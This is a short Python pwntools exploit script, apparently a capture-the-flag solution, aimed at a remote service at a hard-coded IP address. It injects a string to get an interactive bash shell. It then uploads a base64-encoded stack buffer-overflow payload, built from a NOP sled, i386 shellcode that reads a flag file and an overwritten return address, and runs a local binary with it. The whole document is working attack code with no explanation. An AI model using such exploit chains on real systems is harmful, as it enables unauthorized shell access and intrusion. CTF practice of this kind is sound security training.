import base64
import uuid

from pwn import *

context.update(arch='i386', os='linux')

buffer_addr = p32(0xbffffbac)

shellcode = shellcraft.i386.linux.cat("hard_flag.txt")
shellcode += shellcraft.exit(33)
bshellcode = asm(shellcode)
payload = fit({
                (984-len(bshellcode)-300): bshellcode,
                984: buffer_addr,
                1004: "CCCC"
              }, 
              filler='\x90')

assert not any([s in payload for s in '\n\t \x0b'])
assert len(payload) == 1008
b64_payload = base64.encodestring(payload)

payload_lvl1 = "XXXXXXXXXXXXc|pw:16w+0q{"
p = remote('101.0.90.11', 3137)
p.recvuntil('PROG_NAME:')
p.sendline(payload_lvl1)
p.sendline("exec 1<&2")
p.sendline("bash -i")
p.recvuntil("cia@ubuntu:/home/pastebin/cia$")
u = uuid.uuid4().hex
p.sendline('echo "' + b64_payload + '" | base64 -d > /tmp/' + u)
p.sendline('env -i PWD=/home/pastebin/cia /home/pastebin/cia/mine2 </tmp/' + u)
p.interactive()
